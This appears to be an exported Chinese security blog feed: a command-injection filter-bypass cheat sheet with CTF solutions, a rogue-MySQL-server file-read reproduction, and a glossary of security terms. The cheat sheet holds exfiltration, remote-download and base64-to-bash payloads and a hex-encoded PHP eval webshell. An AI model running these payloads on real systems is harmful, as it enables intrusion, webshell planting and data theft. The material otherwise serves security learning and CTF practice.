shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h1 id="无回显之重定向绕过"><a href="#无回显之重定向绕过" class="headerlink" title="无回显之重定向绕过"></a>无回显之重定向绕过</h1><p>先去网站上找一个静态文件xxx</p><ul><li><p>Linux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name xxx|<span class="keyword">while</span> <span class="built_in">read</span> f;<span class="keyword">do</span> sh -c <span class="string">&#x27;echo [base64编码的内容] | base64 -d&#x27;</span> &gt;$(<span class="built_in">dirname</span> <span class="variable">$f</span>)/test.txt;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><blockquote><p>在根目录下找到名为”xxx”的文件，在每个找到的文件所在目录下创建一个名为”test.txt”的文件，并将内容设置为命令执行的结果。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate xxx|<span class="keyword">while</span> <span class="built_in">read</span> f;<span class="keyword">do</span> sh -c <span class="string">&#x27;echo [base64编码的内容] | base64 -d&#x27;</span>&gt;$(<span class="built_in">dirname</span> <span class="variable">$f</span>)/test.txt;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><blockquote><p>locate在数据库中索引更快</p></blockquote></li><li><p>Windows</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b [规定查找的盘符]:\[查找的文件]&#x27;</span>) <span class="keyword">do</span> (<span class="built_in">echo</span> <span class="string">&quot;[写入的内容]&quot;</span> &gt; %i\..\[写入的文件名字]) </span><br><span class="line"></span><br><span class="line"><span class="comment"># base64</span></span><br><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b [规定查找的盘符]:\[查找的文件]&#x27;</span>) <span class="keyword">do</span> (<span class="built_in">echo</span> [<span class="built_in">base64</span>编码的内容] &gt; %i\..\[写入的文件名字])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用certutil解码</span></span><br><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b c:\base64-hm-test.txt&#x27;</span>) <span class="keyword">do</span> (certutil.exe -decode %i\..\base64-hm-test.txt %i\..\1.php) </span><br></pre></td></tr></table></figure></li></ul><h1 id="无回显之反弹shell"><a href="#无回显之反弹shell" class="headerlink" title="无回显之反弹shell"></a>无回显之反弹shell</h1><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><h1 id="出网之远程文件下载"><a href="#出网之远程文件下载" class="headerlink" title="出网之远程文件下载"></a>出网之远程文件下载</h1><p><a href="https://www.cnblogs.com/yokan/p/16069234.html">Windows&amp;Linux文件传输方式总结 - yokan - 博客园 (cnblogs.com)</a></p><p><a href="https://lolbas-project.github.io/%EF%BC%9A%E7%B1%BB%E4%BC%BC%E4%BA%8Egtfobins">https://lolbas-project.github.io/：类似于gtfobins</a></p><h1 id="无回显姿势"><a href="#无回显姿势" class="headerlink" title="无回显姿势"></a>无回显姿势</h1><ul><li><p>判断是否执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">报错</span><br><span class="line">延时</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><p>在线生成：<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>外带</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>不出网+DNS请求出网</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>将文件移动到可访问目录（网站目录，静态 文件目录）</p><ul><li><p>读取内容重定向写入文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>复制</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>创建链接文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h2><ul><li><p>远程下载</p><p><a href="https://paper.seebug.org/834/">总结</a></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n <span class="string">&#x27;下载地址&#x27;</span> <span class="string">&#x27;保存地址&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;下载地址&#x27;</span>,[<span class="string">&#x27;保存地址&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下载文件: certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&#x27;下载地址&#x27;</span> [<span class="string">&#x27;保存地址&#x27;</span>]</span><br><span class="line">删除缓存: certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&#x27;下载地址&#x27;</span> delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过手段之双写certutil</span></span><br><span class="line">certutil &amp; certutil .....</span><br><span class="line"><span class="comment"># 绕过手段之分块传输</span></span><br><span class="line">CertUtil -encode fscan.exe fscan_base64.txt <span class="comment"># 编码</span></span><br><span class="line">cmd=powershell -c <span class="string">&quot;&#x27;§§&#x27; | Out-File C:\fscan_base64.txt -Append&quot;</span> <span class="comment">#PowerShell追加写入</span></span><br><span class="line">certutil -decode fscan_base64.txt fscan.exe <span class="comment"># certutil还原文件</span></span><br></pre></td></tr></table></figure></li><li><p>重定向写入</p><blockquote><p><strong>webshell特殊符号问题，可以先做base64编码写入，然后再解码</strong></p></blockquote></li></ul><h1 id="命令执行绕过姿势"><a href="#命令执行绕过姿势" class="headerlink" title="命令执行绕过姿势"></a>命令执行绕过姿势</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h3><table><thead><tr><th align="center"></th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">管道，前一个命令的输出作为后一个命令的输入</td></tr><tr><td align="center">；</td><td align="center">依次执行命令</td></tr><tr><td align="center">||</td><td align="center">如果前一条命令执行不成功则执行下一条命令</td></tr><tr><td align="center">&amp;</td><td align="center">即使前一条命令执行不成功也会执行下一条命令</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">如果前一条命令执行成功则执行下一条命令</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">换行执行命令</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">内敛执行</td></tr><tr><td align="center">$()</td><td align="center">内敛执行</td></tr></tbody></table><h3 id=""><a href="#" class="headerlink" title="."></a>.</h3><p>Linux 中，<code>.</code>也叫<code>period</code>，它的作用和<code>source</code>一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. filename</code>的意思就是用 bash 执行 filename 文件中的命令。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul><li>base64</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure><ul><li><p>进制绕过</p><p>shell解析八进制，<code>ls</code> → <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php传参时的格式</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>进制转换</li></ul> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul><h3 id="php绕过"><a href="#php绕过" class="headerlink" title="php绕过"></a>php绕过</h3><p>php花样就多了😋</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h3 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h3><ol><li><p>插入\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>插入空字符</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; （只要插入成对的单双引号就可以）</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9为脚本参数</p><p>${xx}代表变量值,只要xx没有定义即可</p><p>内敛执行空命令</p></blockquote></li><li><p>变量拼接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>其他命令代替</p></li><li><p>文件名用通配符</p></li></ol><h3 id="输出重定向符绕过"><a href="#输出重定向符绕过" class="headerlink" title="输出重定向符绕过"></a>输出重定向符绕过</h3><p>重定向符写入文件的本质是将<strong>标准输入输出到文件</strong>中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3c3f70687020406576616c28245f504f53545b277479736563275d293b3f3e|xxd -ps -r|tee shell.php</span><br></pre></td></tr></table></figure><blockquote><p>xxd：用于将十六进制编码的数据转换回原始的二进制数据</p><ul><li><code>-ps</code>：指定输出格式为纯粹的十六进制字符串。</li><li><code>-r</code>：表示进行反向操作，即将十六进制字符串转换为二进制数据。</li></ul><p>tee：同时将读取的标准输入内容输出到标准输出和指定的文件中。</p></blockquote><p>顺着这个思路</p><p><img src="/../images/image-20230912231430079.png" alt="image-20230912231430079"></p><p><img src="/../images/image-20230912231439162.png" alt="image-20230912231439162"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | dd of=file.txt</span><br><span class="line">command | cp /dev/stdin file.txt</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+空字符</li><li>重定向符</li><li><code>&#123;cat,flag.php&#125;</code></li><li>url参数编码，空格%20，制表符%09</li></ol><h3 id="目录分隔符-绕过"><a href="#目录分隔符-绕过" class="headerlink" title="目录分隔符/绕过"></a>目录分隔符<code>/</code>绕过</h3><ol><li><p>多条命令执行，先cd到目的目录，再执行cat等命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>截取环境变量</p><p><code>env</code>或者<code>printenv</code>：打印环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><ol><li><p>ls输出的结果是按照字典排序的</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\放在指令的最末端，表示指令连接下一行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>将文件名（命令）按时间重定向到脚本文件a中，<code>sh a</code>执行脚本a。</p><p>注：将执行的命令反序生成。<code>\\</code>是为了转义，让文件名带上\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令执行，第一个文件名为命令，其他为该命令的参数</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>在这个基础上<code>*o</code>也可以，就是取出满足正则*o的文件名拼接成命令执行。</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h5><p>给出了一个命令执行接口，测试之后发现长度限制为6,正常思路</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>然后尝试访问&#x2F;tmp&#x2F;a，服务器没有报错，说明<code>&gt;a</code>其实是执行成功了的。</p><ul><li><p>解法1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为cp的文件</p><p>第二条命令执行<code>cp /* .</code>，将根目录下的文件复制到当前目录下，然后访问&#x2F;tmp&#x2F;flag即可</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>解法2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为nl的文件</p><p>第二条命令执行<code>nl /*&gt;a</code>，读取根目录下所有文件的内容重定向到a中，然后访问&#x2F;tmp&#x2F;a即可</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>解法3</p><p>脚本直接写🐎</p></li></ul><h3 id="无数字绕过"><a href="#无数字绕过" class="headerlink" title="无数字绕过"></a>无数字绕过</h3><p>安洵杯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能用&#96;$</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Client 任意文件读取攻击复现</title>
      <link href="/2023/05/31/Mysql%20Client%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/"/>
      <url>/2023/05/31/Mysql%20Client%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-Client-任意文件读取攻击"><a href="#Mysql-Client-任意文件读取攻击" class="headerlink" title="Mysql Client 任意文件读取攻击"></a>Mysql Client 任意文件读取攻击</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h2 id="原理和攻击思路"><a href="#原理和攻击思路" class="headerlink" title="原理和攻击思路"></a>原理和攻击思路</h2><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p><p>简单的说就是</p><p><strong>正常的流程</strong></p><p>如果客户端要用load data local infile 将文件插入表中的话，客户端会先发一个请求包，这个请求包里包含了要插入的文件的路径。而服务器接下来返回一个Response TABULAR包，里面包含文件路径，然后客户端得到了许可才开始传输文件。</p><p><strong>漏洞产生点</strong></p><p><img src="/../images/291ea879-e6dd-46a6-af48-4dd927485670.png-w331s" alt="img"></p><blockquote><p><strong>服务端可以在任何查询语句后回复文件传输请求</strong></p></blockquote><p>所以我们只需要伪造服务端返回的Response TABULAR包，并在该包中指定想要读取的文件，客户端就会把该文件的内容返回给服务端</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li><p>客户端必须启用LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--local-infile=OFF 可以修复，或者更改全局变量local_infile(我在5.7下参数可以，更改全局变量不行？？)</span><br></pre></td></tr></table></figure></li><li><p>客户端支持非SSL连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--ssl-mode=VERIFY_IDENTITY 可以修复</span><br></pre></td></tr></table></figure></li><li><p>目标web<strong>存在连接数据库的功能</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据库弱口令扫描，连接检查</span><br><span class="line">网站重装漏洞（需要连接数据库）</span><br><span class="line">数据迁移服务</span><br><span class="line">Excle从数据库中同步数据到表格内</span><br></pre></td></tr></table></figure></li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端与服务端的mysql都是5.7版本</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>默认开启</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>注：一开始使用服务端使用8版本不行</p><p>攻击者（服务端）起脚本</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>受害者连接</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>攻击者查看<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见名词与概念</title>
      <link href="/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/"/>
      <url>/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">常见名词</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">没有补丁的安全漏洞</td></tr><tr><td align="center">Nday</td><td align="center">官方发布了补丁，但该漏洞仍然大量未修复，存在一定可利用性</td></tr><tr><td align="center">POC</td><td align="center">一段无害的用来证明漏洞存在的代码</td></tr><tr><td align="center">EXP（exploit）</td><td align="center">一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码</td></tr><tr><td align="center">payload（有效载荷）</td><td align="center">指成功 exploit 之后，真正在目标系统执行的代码或指令</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures 公共漏洞和暴露      CVE编号–漏洞标签</td></tr><tr><td align="center">ShellCode</td><td align="center">一段16进制机器码，可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，从而执行任意指令，EIP<code>寄存器，它里面存放的值是</code>CPU<code>下次要执行的指令地址，因此可以通过修改</code>EIP<code>寄存器的值来执行</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">模糊测试：随机输入，观察输</td></tr><tr><td align="center">CMS</td><td align="center">内容管理系统：指的是一种内容编辑程序。就像在博客写文章一样，不需要懂得编程的人，也可以通过CMS发布，更改，管理内容。</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   国家信息安全漏洞共享平台</td></tr><tr><td align="center">Rootkit</td><td align="center">载入到操作系统内核中的恶意软件，具有root权限</td></tr><tr><td align="center">WAF</td><td align="center">Web应用防火墙，具有针对 HTTP&#x2F;HTTPS 的安全策略</td></tr><tr><td align="center">堡垒机</td><td align="center">监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</td></tr><tr><td align="center">彩虹表</td><td align="center">空间换时间，通过哈希碰撞破解哈希值</td></tr><tr><td align="center">供应链攻击</td><td align="center">攻击软件供应商，如向更新程序中注入木马</td></tr><tr><td align="center">沙箱</td><td align="center">虚拟系统程序：     在隔离环境中，用以测试不受信任的文件或应用程序等行为的工具</td></tr><tr><td align="center">域名泛解析</td><td align="center"><code>*.a.com</code>指向同一IP</td></tr><tr><td align="center">OSINT</td><td align="center"><strong>公开来源情报</strong>（OSINT, Open Source INTelligence）是从公开来源收集到的情报</td></tr><tr><td align="center">IDS</td><td align="center">Intrusion Detection System（入侵检测系统），旁路部署</td></tr><tr><td align="center">IPS</td><td align="center">Intrusion Prevention System（入侵防御设备），串联部署</td></tr><tr><td align="center">SA</td><td align="center">Situation Awareness（态势感知），态势感知是一种基于环境的、动态、整体地洞悉全网安全风险的能力。它以安全大数据（采集全网流量数据和安全防护设备日志信息）为基础，从全局视角对全网安全威胁进行发现识别、理解分析展示和响应处置，并预测发展趋势，为后续网络安全的相关决策与行动提供数据依据。</td></tr><tr><td align="center">AV</td><td align="center">anti-virus killer（反病毒杀手），防病毒软件如WinowsDefinder，360</td></tr><tr><td align="center">上&#x2F;下游代理</td><td align="center">请求：客户端→下游代理→上游代理→服务端                                                                                                        响应：服务端→上游代理→下游代理→客户端</td></tr><tr><td align="center">RASP</td><td align="center">运行时应用程序自我保护（<code>Runtime application self-protection</code>，简称<code>RASP</code>）RASP采用<code>基于攻击行为分析</code>的<code>主动防御</code>机制，严防<code>文件读写</code>、<code>数据访问</code>、<code>命令执行</code>等Web应用系统命脉（在Web应用程序执行关键的Java API之前插入防御逻辑（API HOOK），从而控制原类方法执行的业务逻辑）</td></tr><tr><td align="center">路由器</td><td align="center">路由器（Router）是一种网络设备，用于将数据包从一个网络转发到另一个网络。主要功能<strong>根据网络协议决定最佳的路径</strong>来转发数据，<strong>网络地址转换（NAT）</strong></td></tr><tr><td align="center">交换机</td><td align="center">交换机是一种网络设备，用于在局域网中传输数据包。它有多个端口，可以连接多台计算机或其他网络设备，如打印机、服务器等。交换机能够根据每个数据包的目标地址，将其转发到对应的目标设备，实现设备之间的通信和数据传输。交换机还可以提供一些额外的功能，如虚拟局域网（VLAN）划分、安全策略配置等。</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="蠕虫、病毒之间的区别"><a href="#蠕虫、病毒之间的区别" class="headerlink" title="蠕虫、病毒之间的区别"></a>蠕虫、病毒之间的区别</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>产生的原因</p><p>因为http是无状态协议，假设我以khaz的身份去访问服务器，等到下一次我再次访问服务器时，服务器还是不知道我是谁，我仍需要向服务器提交数据说明我是khaz。这样就导致了在同一个网站下我每次访问一个服务都需要提交一次数据，很麻烦。</p></li><li><p>本质</p><p>浏览器存储技术，实现每次HTTP请求都自动提交数据给服务器的技术。</p></li><li><p>机制</p><p>当用户第一次登录后，服务器返回的response中会有一个set-cookie字段，当我们的浏览器接收到response后，就会将set-cookie中的值保存到cookie中，然后每次我们登陆时浏览器就会自动在请求中为我们带上cookie，服务端接收后去数据库中核实cookie信息。</p></li><li><p>实例</p><p>通常，我们可以从很多网站的登录界面中看到“请记住我”这样的选项，如果你勾选了它之后再登录，那么在下一次访问该网站的时候就不需要进行重复而繁琐的登录动作了，而这个功能就是通过Cookie实现的。</p></li></ul></li><li><p>session</p><ul><li><p>产生的原因</p><p>因为cookie是保存在浏览器中的，用户可以随意查看和修改很不安全。</p></li><li><p>本质</p><p>一种概念。让HTTP从无状态连接变为有状态连接（会话状态）。</p></li><li><p>机制</p><p>当用户第一次登录后，服务端会在内存中生成session对象用于保存用户信息，同时通过set-cookie字段将session-id保存到浏览器中。在会话的有效期内，客户端每次请求都会带上session-id，服务端根据session-id找到对应的session，核实用户的身份。</p><blockquote><p>注：会话的有效期是通过设置cookie的有效期实现的。</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>产生的原因</p><p>因为session的机制，服务端需要在内存中保存session，就会出现一些问题。例如：</p><ul><li>大量session对象的存储带来的内存消耗</li><li>各服务器之间session的复制</li><li>专门用于存储session的服务器宕机</li></ul></li><li><p>本质</p><p>身份令牌</p></li><li><p>机制</p><p>当用户第一次登陆后，服务端会生成一个token令牌。通过 set-cookie字段保存到浏览器中。</p><p>在令牌的有效期内，客户端每次请求都会带上token令牌，服务端通过保存的密钥验证签名来核对用户身份。</p></li><li><p>实例</p><p> JWT（json web token）</p><p>总结</p><blockquote><p>cookie：</p><p>客户端保存，服务端不保存。</p><p>session：</p><p>客户端只保存session-id，服务端保存session对象。</p><p>token：</p><p>客户端保存token，服务端只保存token签名的密钥。</p></blockquote></li></ul></li></ol><h1 id="正向-x2F-反向代理"><a href="#正向-x2F-反向代理" class="headerlink" title="正向&#x2F;反向代理"></a>正向&#x2F;反向代理</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>正向代理</p><blockquote><p>转发代理，通常称为代理、代理服务器或 Web 代理，是位于一组客户端计算机之前的服务器,确保没有源站直接与该特定客户端通信</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="正向代理流"></p></li></ul><p>​        在标准的互联网通信中，计算机 A 将直接与计算机 C 保持联系，客户端将请求发送到<a href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">源服务器</a>，并且源服务器将响应客户端。当存在正向&#x2F;转发代理时，A 将请求发送到 B，B 随后将请求转发给 C。C 将向 B 发送响应，而 B 则将响应转发给 A。</p><ul><li><p>反向代理</p><blockquote><p>反向代理是位于一个或多个 Web 服务器前面的服务器，拦截来自客户端的请求，确保没有客户端直接与该源站通信。</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="反向代理流"></p></li></ul><p>​       通常，来自 D 的所有请求都将直接发送到 F，而 F 会直接将响应发送到 D。使用反向代理，来自 D 的所有请求都将直接发送给 E，而 E 会将其请求发送到 F 并从 F 接收响应，然后将适当响应传递给 D。</p><table><thead><tr><th align="left"></th><th>对象</th><th>优点</th></tr></thead><tbody><tr><td align="left">正向&#x2F;转发代理</td><td>客户端</td><td>匿名，绕过访问限制</td></tr><tr><td align="left">反向代理</td><td>服务端</td><td>更加安全，提高服务器性能</td></tr></tbody></table><h1 